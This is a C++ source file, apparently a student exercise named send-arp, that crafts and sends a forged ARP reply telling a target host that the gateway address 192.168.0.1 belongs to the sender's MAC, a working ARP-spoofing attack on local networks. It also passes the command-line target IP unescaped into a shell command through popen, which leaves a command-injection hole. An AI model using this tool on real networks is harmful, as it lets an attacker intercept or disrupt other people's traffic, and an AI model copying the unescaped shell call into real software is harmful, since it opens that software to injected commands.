#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <cstring>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool getMyIp(const char* dev, Ip* ip) {
    int sock;
    struct ifreq ifr;
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) {
        return false;
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        close(sock);
        return false;
    }
    *ip = Ip(inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
    close(sock);
    return true;
}

bool getMyMac(const char* dev, Mac* mac) {
    int sock;
    struct ifreq ifr;
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock == -1) {
        return false;
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return false;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
    close(sock);
    return true;
}

string getMacAddress(const string& interfaceName, const string& ipAddress) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        cerr << "Socket creation error" << endl;
        return "";
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interfaceName.c_str(), IFNAMSIZ - 1);

    struct sockaddr_in* sockaddr = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
    sockaddr->sin_family = AF_INET;
    sockaddr->sin_port = 0;
    inet_pton(AF_INET, ipAddress.c_str(), &sockaddr->sin_addr);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        cerr << "MAC address retrieval error" << endl;
        close(sock);
        return "";
    }

    unsigned char* mac = reinterpret_cast<unsigned char*>(ifr.ifr_hwaddr.sa_data);
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    close(sock);
    return macStr;
}
string executeCommand(const char* cmd) {
    string result = "";
    char buffer[128];

    FILE* pipe = popen(cmd, "r");
    if (!pipe) {
        cerr << "popen failed" << endl;
        return result;
    }

    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != nullptr) {
            result += buffer;
        }
    }

    pclose(pipe);
    return result;
}


int main(int argc, char* argv[]) {
    if (argc < 3) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac myMac;
    Ip myIp;
    if (!getMyMac(dev, &myMac) || !getMyIp(dev, &myIp)) {
        fprintf(stderr, "Failed to get device information.\n");
        return -1;
    }

    EthArpPacket packet;
    string target_ip = argv[2];
    string command = "arp -a | grep \""+target_ip+"\" | awk \'{print $4}\'";
    string target_mac = executeCommand(command.c_str());
    
    packet.eth_.dmac_ = Mac(target_mac); // 
    packet.eth_.smac_ = myMac; // sender's MAC
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply); 
    packet.arp_.smac_ = myMac; // sender's MAC
    packet.arp_.sip_ = htonl(Ip("192.168.0.1")); // IP of Gateway
    packet.arp_.tmac_ = Mac(target_mac); // MAC of target
    packet.arp_.tip_ = htonl(Ip(target_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
    return 0;
}
